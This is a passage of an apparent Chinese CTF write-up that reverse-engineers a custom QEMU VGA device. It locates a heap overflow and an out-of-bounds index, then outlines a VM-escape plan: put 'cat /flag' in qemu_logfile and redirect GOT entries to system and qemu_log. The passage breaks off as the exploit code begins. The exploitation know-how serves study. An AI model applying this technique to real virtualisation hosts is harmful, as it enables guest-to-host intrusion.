__int16)mem_value);</span><br><span class="line">      v19 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * v17;</span><br><span class="line">      *((_QWORD *)v19 + <span class="number">9851</span>) = v18;</span><br><span class="line">      <span class="keyword">if</span> ( v18 )</span><br><span class="line">      &#123;</span><br><span class="line">        vulncnt = v17 + <span class="number">1</span>;</span><br><span class="line">        *((_DWORD *)v19 + <span class="number">19704</span>) = mem_valuea;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( BYTE2(mem_value) &lt;= <span class="number">0x10</span>uLL )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * BYTE2(mem_value);</span><br><span class="line">    <span class="keyword">if</span> ( *((_QWORD *)v20 + <span class="number">9851</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int16)mem_value &lt;= <span class="number">0x1000</span>u )</span><br><span class="line">        *((_QWORD *)v20 + <span class="number">9852</span>) = (<span class="keyword">unsigned</span> __int16)mem_value;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆向之后会发现这里其实就是一个堆题，总共有五个选项</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v5==<span class="number">0</span>时，opaque-&gt;vs[idx].buf = <span class="built_in">malloc</span>(mem_value &amp; <span class="number">0xfff</span>); max_size == mem_value &amp; <span class="number">0xfff</span></span><br><span class="line">v5==<span class="number">1</span>时，当cur_size &lt; max_size时，opaque-&gt;vs[idx].buf[cur_size++] = mem_value &amp; <span class="number">0xff</span></span><br><span class="line">v5==<span class="number">2</span>时，printf_chk(<span class="number">1</span>, opaque-&gt;vs[idx].buf)</span><br><span class="line">v5==<span class="number">3</span>时，opaque-&gt;vs[idx].max_size = mem_value &amp; <span class="number">0xfff</span></span><br><span class="line">v5==<span class="number">4</span>时，opaque-&gt;vs[idx].buf[cur_size++] = mem_value &amp; <span class="number">0xff</span></span><br></pre></td></tr></table></figure><p>需要吐槽的是，这两次汇编语言表达的意思一样但是表达的形式不一样，所以莫名其妙的需要依靠汇编来逆向。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000068F521 48 81 C2 3D 13 00 00          add     rdx, 133Dh</span><br><span class="line">.text:000000000068F528 48 C1 E2 04                   shl     rdx, 4</span><br><span class="line">.text:000000000068F52C 48 8B 74 13 08                mov     rsi, [s+rdx+8]</span><br><span class="line">.text:000000000068F531 48 85 F6                      test    rsi, rsi</span><br><span class="line">.text:000000000068F534 0F 84 24 FD FF FF             jz      loc_68F25E</span><br><span class="line">.text:000000000068F534</span><br><span class="line">.text:000000000068F53A 48 83 C4 18                   add     rsp, 18h</span><br><span class="line">.text:000000000068F53E BF 01 00 00 00                mov     edi, 1</span><br><span class="line">.text:000000000068F543 31 C0                         xor     eax, eax</span><br><span class="line">.text:000000000068F545 5B                            pop     s</span><br><span class="line">.text:000000000068F546 5D                            pop     rbp</span><br><span class="line">.text:000000000068F547 E9 F4 99 D7 FF                jmp     ___printf_chk</span><br><span class="line"></span><br><span class="line">······</span><br><span class="line"></span><br><span class="line">.text:000000000068F47B 48 89 E9                      mov     rcx, rbp</span><br><span class="line">.text:000000000068F47E 48 C1 E1 04                   shl     rcx, 4</span><br><span class="line">.text:000000000068F482 48 01 CB                      add     s, rcx</span><br><span class="line">.text:000000000068F485 48 85 C0                      test    rax, rax</span><br><span class="line">.text:000000000068F488 48 89 83 D8 33 01 00          mov     [rbx+133D8h], rax</span><br><span class="line">.text:000000000068F48F 0F 84 C9 FD FF FF             jz      loc_68F25E</span><br><span class="line">.text:000000000068F48F</span><br><span class="line">.text:000000000068F495 48 8B 54 24 08                mov     rdx, qword ptr [rsp+28h+chunk_size]</span><br><span class="line">.text:000000000068F49A 48 83 C5 01                   add     rbp, 1</span><br><span class="line">.text:000000000068F49E 48 89 2D 3B A0 A3 00          mov     cs:vulncnt, rbp</span><br><span class="line">.text:000000000068F4A5 81 E2 FF FF 00 00             and     edx, 0FFFFh</span><br><span class="line">.text:000000000068F4AB 89 93 E0 33 01 00             mov     [rbx+133E0h], edx</span><br><span class="line">.text:000000000068F4B1 E9 A8 FD FF FF                jmp     loc_68F25E</span><br></pre></td></tr></table></figure><p>上面可以看到漏洞点是<code>v5 == 4</code>时，对<code>cur_size</code>没有检测，可以实现堆溢出，当然我感觉三可以修改最大size配合二也是可以实现堆溢出，但是直接用四即可实现所以也没必要再去搞三二了。</p><p>再就是存在一个大的问题就是，上面所有对idx的验证就是小于等于16，所以这一出也就导致我们可以溢出到下一个成员<code>latch</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">cydf_vga_mem_read</span><span class="params">(CydfVGAState *opaque, hwaddr addr, <span class="keyword">uint32_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">bool</span> v4; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  v3 = opaque-&gt;latch[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !(_WORD)v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (opaque-&gt;vga.sr[<span class="number">7</span>] &amp; <span class="number">1</span>) == <span class="number">0</span>;</span><br><span class="line">    opaque-&gt;latch[<span class="number">0</span>] = addr | v3;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">    <span class="keyword">return</span> vga_mem_readb(&amp;opaque-&gt;vga, addr);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = (opaque-&gt;vga.sr[<span class="number">7</span>] &amp; <span class="number">1</span>) == <span class="number">0</span>;</span><br><span class="line">  opaque-&gt;latch[<span class="number">0</span>] = (_DWORD)addr &lt;&lt; <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">return</span> vga_mem_readb(&amp;opaque-&gt;vga, addr);</span><br><span class="line">LABEL_3:</span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0xFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">255LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( addr - <span class="number">0x18000</span> &lt;= <span class="number">0xFF</span> &amp;&amp; (opaque-&gt;vga.sr[<span class="number">23</span>] &amp; <span class="number">0x44</span>) == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">return</span> cydf_mmio_blt_read(opaque, (<span class="keyword">unsigned</span> __int8)addr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFF</span>LL;</span><br><span class="line">    v6 = (<span class="keyword">char</span> *)opaque + <span class="number">4</span> * (addr &gt;&gt; <span class="number">15</span>);</span><br><span class="line">    v7 = addr &amp; <span class="number">0x7FFF</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt; *((_DWORD *)v6 + <span class="number">0x44D5</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *((_DWORD *)v6 + <span class="number">0x44D3</span>) + v7;</span><br><span class="line">      <span class="keyword">if</span> ( (opaque-&gt;vga.gr[<span class="number">11</span>] &amp; <span class="number">0x14</span>) == <span class="number">20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 *= <span class="number">16</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( (opaque-&gt;vga.gr[<span class="number">11</span>] &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 *= <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;vga.vram_ptr[opaque-&gt;cydf_addr_mask &amp; v8];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在这个函数中其实是可以控制<code>latch[0]</code>的值的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( (<span class="keyword">char</span>)sr_index )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    opaque-&gt;vga.sr[(<span class="keyword">unsigned</span> __int8)sr_index] = sr_mask[(<span class="keyword">unsigned</span> __int8)sr_index] &amp; v4;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)sr_index == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">    opaque-&gt;vga.sr[<span class="number">6</span>] = <span class="number">3</span> * ((v4 &amp; <span class="number">0x17</span>) == <span class="number">18</span>) + <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">    cydf_update_memory_access(opaque);</span><br><span class="line">    sr_index = opaque-&gt;vga.sr_index;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xA</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xB</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xC</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xD</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xE</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xF</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x13</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x14</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x15</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x16</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x18</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x19</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1A</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1B</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1C</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1D</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1E</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1F</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xCC</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xCD</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xCE</span>:</span><br><span class="line">    LABEL_28:</span><br><span class="line">    opaque-&gt;vga.sr[sr_index] = v4;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在这里我们正好可以控制<code>opaque-&gt;vga.sr[0xCC]</code>的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qemu_log</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v4; <span class="comment">// r8</span></span><br><span class="line">  __int64 v5; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">int</span> ret; <span class="comment">// [rsp+1Ch] [rbp-D4h]</span></span><br><span class="line">  gcc_va_list va; <span class="comment">// [rsp+20h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-B8h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+48h] [rbp-A8h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+50h] [rbp-A0h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+58h] [rbp-98h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+60h] [rbp-90h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+68h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  va_start(va, fmt);</span><br><span class="line">  v3 = va_arg(va, _QWORD);</span><br><span class="line">  v1 = va_arg(va, _QWORD);</span><br><span class="line">  v2 = va_arg(va, _QWORD);</span><br><span class="line">  v4 = va_arg(va, _QWORD);</span><br><span class="line">  v5 = va_arg(va, _QWORD);</span><br><span class="line">  va_end(va);</span><br><span class="line">  v10 = v3;</span><br><span class="line">  v11 = v1;</span><br><span class="line">  v12 = v2;</span><br><span class="line">  v13 = v4;</span><br><span class="line">  v14 = v5;</span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( qemu_logfile )</span><br><span class="line">  &#123;</span><br><span class="line">    va_start(va, fmt);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    ret = <span class="built_in">vfprintf</span>(qemu_logfile, fmt, va);</span><br><span class="line">    <span class="keyword">if</span> ( ret &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>qemu_log</code>函数中，存在一个<code>vfprintf</code>函数调用了bss上的一个变量<code>qemu_logfile</code>。那么利用思路如下：</p><ol><li>  修改qemu_logfile的内容为<code>cat /flag</code></li><li>  修改vfprintf函数的got表为system</li><li>  修改printf_chk函数的got表为qemu_log</li><li>  最后让v5等于2，触发printf_chk</li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先吐槽一点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">switch ( addr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> 4uLL:</span><br><span class="line">  <span class="keyword">case</span> 0x24uLL:</span><br><span class="line">  opaque-&gt;vga.cr_index = value;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 5uLL:</span><br><span class="line">  <span class="keyword">case</span> 0x25uLL:</span><br><span class="line">  cr_index = opaque-&gt;vga.cr_index;</span><br><span class="line">  <span class="keyword">if</span> ( (unsigned __int8)cr_index &lt;= 0x18u )</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span> ( (opaque-&gt;vga.cr[17] &amp; 0x80u) == 0 || (unsigned __int8)cr_index &gt; 7u )</span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.cr[(unsigned __int8)cr_index] = value;</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)cr_index != 24 &amp;&amp; ((1LL &lt;&lt; <span class="string">cr_index) &amp; 0x8200F1) != 0 )</span></span><br><span class="line"><span class="string">  LABEL_35:</span></span><br><span class="line"><span class="string">  opaque-&gt;vga.update_retrace_info((VGACommonState *)opaque);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else if ( (_BYTE)cr_index</span> == 7 )</span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.cr[7] = value &amp; 0x10 | opaque-&gt;vga.cr[7] &amp; 0xEF;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (unsigned __int8)cr_index &lt;= 0x1Du )</span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.cr[cr_index] = value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0xAuLL:</span><br><span class="line">  <span class="keyword">case</span> 0x2AuLL:</span><br><span class="line">  opaque-&gt;vga.fcr = value &amp; 0x10;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x10uLL:</span><br><span class="line">  ar_flip_flop = opaque-&gt;vga.ar_flip_flop;</span><br><span class="line">  <span class="keyword">if</span> ( ar_flip_flop )</span><br><span class="line">  &#123;</span><br><span class="line">  v13 = opaque-&gt;vga.ar_index &amp; 0x1F;</span><br><span class="line">  switch ( opaque-&gt;vga.ar_index &amp; 0x1F )</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">case</span> 0:</span><br><span class="line">  <span class="keyword">case</span> 1:</span><br><span class="line">  <span class="keyword">case</span> 2:</span><br><span class="line">  <span class="keyword">case</span> 3:</span><br><span class="line">  <span class="keyword">case</span> 4:</span><br><span class="line">  <span class="keyword">case</span> 5:</span><br><span class="line">  <span class="keyword">case</span> 6:</span><br><span class="line">  <span class="keyword">case</span> 7:</span><br><span class="line">  <span class="keyword">case</span> 8:</span><br><span class="line">  <span class="keyword">case</span> 9:</span><br><span class="line">  <span class="keyword">case</span> 0xA:</span><br><span class="line">  <span class="keyword">case</span> 0xB:</span><br><span class="line">  <span class="keyword">case</span> 0xC:</span><br><span class="line">  <span class="keyword">case</span> 0xD:</span><br><span class="line">  <span class="keyword">case</span> 0xE:</span><br><span class="line">  <span class="keyword">case</span> 0xF:</span><br><span class="line">  <span class="keyword">case</span> 0x12:</span><br><span class="line">  opaque-&gt;vga.ar[v13] = value &amp; 0x3F;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x10:</span><br><span class="line">  opaque-&gt;vga.ar[v13] = value &amp; 0xEF;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x11:</span><br><span class="line">  goto LABEL_42;</span><br><span class="line">  <span class="keyword">case</span> 0x13:</span><br><span class="line">  <span class="keyword">case</span> 0x14:</span><br><span class="line">  LOBYTE(value) = value &amp; 0xF;</span><br><span class="line">  LABEL_42:</span><br><span class="line">  opaque-&gt;vga.ar[v13] = value;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  default:</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.ar_index = value &amp; 0x3F;</span><br><span class="line">  &#125;</span><br><span class="line">  opaque-&gt;vga.ar_flip_flop = ar_flip_flop ^ 1;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x12uLL:</span><br><span class="line">  opaque-&gt;vga.msr = value &amp; 0xEF;</span><br><span class="line">  opaque-&gt;vga.update_retrace_info((VGACommonState *)opaque);</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x14uLL:</span><br><span class="line">  opaque-&gt;vga.sr_index = value;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>着狗屎ida翻译的是0x14</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000068F5F6 48 81 EB B4 03 00 00          sub     addr, 3B4h                      ; switch 39 cases</span><br><span class="line">.text:000000000068F5FD 48 83 FB 26                   cmp     rbx, 26h</span><br><span class="line">.text:000000000068F601 77 C1                         ja      short def_68F603                ; jumptable 000000000068F603 default case, cases 950-953,955-959,961,963,970-973,976-979,982-985</span><br><span class="line">.text:000000000068F601                                                                       ; jumptable 000000000068F792 default case, cases 5,32-47,50-79,82-111,114-143,146-175,178-203,207,210-239</span><br><span class="line">.text:000000000068F601</span><br><span class="line">.text:000000000068F603 FF 24 DD 78 8E A9 00          jmp     ds:jpt_68F603[rbx*8]            ; switch jump</span><br></pre></td></tr></table></figure><p> 在这里是减去0x3B4</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315161250131.png"                      alt="image-20230315161250131"                ></p><p>但是这里真正需要的是0x10，又一次翻译错误。</p><p>忽略这些小错误之后直接编写exp即可</p><h3 id="综上，可得exp"><a href="#综上，可得exp" class="headerlink" title="综上，可得exp"></a>综上，可得exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 